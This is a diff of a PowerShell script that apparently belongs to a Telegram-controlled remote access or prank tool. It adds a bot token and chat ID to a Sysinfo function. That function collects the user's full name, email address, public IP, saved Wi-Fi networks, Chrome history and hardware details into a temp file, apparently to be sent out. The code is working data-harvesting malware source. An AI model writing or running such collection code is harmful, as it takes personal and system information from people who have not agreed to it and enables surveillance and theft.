@@ -437,6 +437,9 @@ Write-Output "$Value2"
 
 
 Function Sysinfo {
+$token="$tg"
+$ChatID = "$cid"
+
 $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full")
 $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
 $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
@@ -450,7 +453,8 @@ $computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Man
 $computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List
 $computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
 $computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table
-
+$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution
+$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }
 $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
 $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
 
@@ -471,7 +475,7 @@ $Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.
 $Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
 
 $outpath = "$env:temp\systeminfo.txt"
-"USER INFO `n =========================================================================" | Out-File -FilePath $outpath -Encoding ASCII
+"USER INFO `n ======================================================" | Out-File -FilePath $outpath -Encoding ASCII
 "Full Name          : $fullName" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Email Address      : $email" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Location           : $Geolocate" | Out-File -FilePath $outpath -Encoding ASCII -Append
@@ -479,12 +483,26 @@ $outpath = "$env:temp\systeminfo.txt"
 "Language           : $systemLanguage" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Keyboard Layout    : $keyboardLayoutID" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"NETWORK INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Public IP          : $computerPubIP" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Saved Networks     : $outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"NETWORK INFO `n ===================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Public IP          : $computerPubIP`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Saved Networks     : `n$outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"HARDWARE INFO `n ==================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"computer           : $computerSystem" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"BIOS Info          : $computerBIOS" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"RAM Info           : $computerRamCapacity" | Out-File -FilePath $outpath -Encoding ASCII -Append
+($computerRam| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
+"OS Info            `n ---------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+($computerOs| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
+"CPU Info           `n ---------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+($computerCpu| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Graphics Info      `n ---------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+($videocard| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
+"HDD Info           `n ---------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+($Hdds| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 
-$textfile2 = Get-Content "$env:temp\systeminfo.txt"
-Write-Output $textfile2
+$Pathsys = "$env:temp\systeminfo.txt"
+$msgsys = Get-Content -Path $Pathsys -Raw
+Write-Output "$msgsys"
 }
 
 Function Send-DadJoke 
